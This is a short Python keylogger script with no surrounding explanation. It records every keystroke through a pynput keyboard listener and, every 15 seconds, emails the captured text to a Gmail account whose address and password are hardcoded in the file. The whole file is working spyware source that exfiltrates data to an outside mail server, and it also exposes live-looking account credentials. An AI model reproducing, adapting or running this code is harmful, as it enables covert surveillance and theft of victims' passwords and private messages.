import pynput
import smtplib
import threading

vocuablary = "Keylogger Starting"

def write(letter):
    global vocuablary
    print("*********************************************")
    try:
        vocuablary += str(letter.char)
    except AttributeError:
        if letter == letter.space:
            vocuablary+= " "
        elif letter == letter.backspace:
            num = len(vocuablary)
            num -=1
            val =0
            result =""
            while num > val:
                result += vocuablary[val]
                val +=1
            vocuablary = result

        elif letter == letter.enter:
            vocuablary += "\n"
        else:
            vocuablary += str(letter)

    print(vocuablary)
def send_mail(msg):
    global vocuablary
    server = smtplib.SMTP("smtp.gmail.com:587")
    server.starttls()
    server.login("tryyourself78@gmail.com","G4m30v3r")
    server.sendmail("tryyourself78@gmail.com","tryyourself78@gmail.com",msg)
    server.quit()

def timer():
    global vocuablary
    if vocuablary:
        send_mail(vocuablary)
        vocuablary=""
    timers = threading.Timer(15,timer)
    timers.start()

listen = pynput.keyboard.Listener(on_press=write)

with listen:
    timer()
    listen.join()